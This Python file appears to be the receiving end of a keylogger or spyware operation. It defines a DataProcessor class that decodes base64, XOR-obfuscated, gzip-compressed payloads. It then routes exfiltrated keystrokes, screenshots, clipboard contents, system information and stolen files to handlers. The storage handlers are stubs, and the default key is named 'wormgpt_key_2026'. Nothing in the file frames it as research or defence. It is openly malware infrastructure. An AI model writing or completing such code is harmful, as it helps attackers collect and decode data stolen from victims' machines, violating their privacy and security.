import base64
import gzip
import json
import logging
from typing import Dict, Any, Optional

class DataProcessor:
    def __init__(self, encryption_key="wormgpt_key_2026"):
        self.key = encryption_key
        self.logger = logging.getLogger(__name__)
    
    def _xor_cipher(self, data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        key_bytes = self.key.encode('utf-8')
        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte ^ key_bytes[i % len(key_bytes)])
        return bytes(result)
    
    def decode_payload(self, payload: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Decode and decompress exfiltrated payload"""
        try:
            encoded_data = payload.get('data', '')
            if not encoded_data:
                return None
                
            # Decode base64
            obfuscated = base64.b64decode(encoded_data)
            
            # Decrypt with XOR
            compressed = self._xor_cipher(obfuscated)
            
            # Decompress
            json_str = gzip.decompress(compressed).decode('utf-8')
            
            # Parse JSON
            decoded_payload = json.loads(json_str)
            
            return decoded_payload
        except Exception as e:
            self.logger.error(f"Failed to decode payload: {str(e)}")
            return None
    
    def process_data(self, session_id: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Process decoded exfiltrated data based on type"""
        decoded = self.decode_payload(payload)
        if not decoded:
            return {'status': 'error', 'message': 'Failed to decode payload'}
        
        data_type = decoded.get('type')
        data_content = decoded.get('data')
        
        # Process based on data type
        if data_type == 'keystrokes':
            return self._process_keystrokes(session_id, data_content)
        elif data_type == 'screenshot':
            return self._process_screenshot(session_id, data_content)
        elif data_type == 'clipboard':
            return self._process_clipboard(session_id, data_content)
        elif data_type == 'system_info':
            return self._process_system_info(session_id, data_content)
        elif data_type == 'file_exfil':
            return self._process_file_exfil(session_id, data_content)
        else:
            return {'status': 'warning', 'message': f'Unknown data type: {data_type}'}
    
    def _process_keystrokes(self, session_id: str, data: str) -> Dict[str, Any]:
        """Process keystroke data"""
        # Store keystrokes in database
        # Implementation depends on your database schema
        return {'status': 'ok', 'message': 'Keystrokes processed'}
    
    def _process_screenshot(self, session_id: str, data: str) -> Dict[str, Any]:
        """Process screenshot data"""
        # Store screenshot in database or file system
        # Implementation depends on your storage strategy
        return {'status': 'ok', 'message': 'Screenshot processed'}
    
    def _process_clipboard(self, session_id: str, data: str) -> Dict[str, Any]:
        """Process clipboard data"""
        # Store clipboard data in database
        # Implementation depends on your database schema
        return {'status': 'ok', 'message': 'Clipboard data processed'}
    
    def _process_system_info(self, session_id: str, data: Dict[str, Any]) -> Dict[str, Any]:
        """Process system information"""
        # Update session with system info
        # Implementation depends on your session management
        return {'status': 'ok', 'message': 'System info processed'}
    
    def _process_file_exfil(self, session_id: str, data: str) -> Dict[str, Any]:
        """Process exfiltrated file data"""
        # Store file data
        # Implementation depends on your file storage strategy
        return {'status': 'ok', 'message': 'File exfiltrated'}
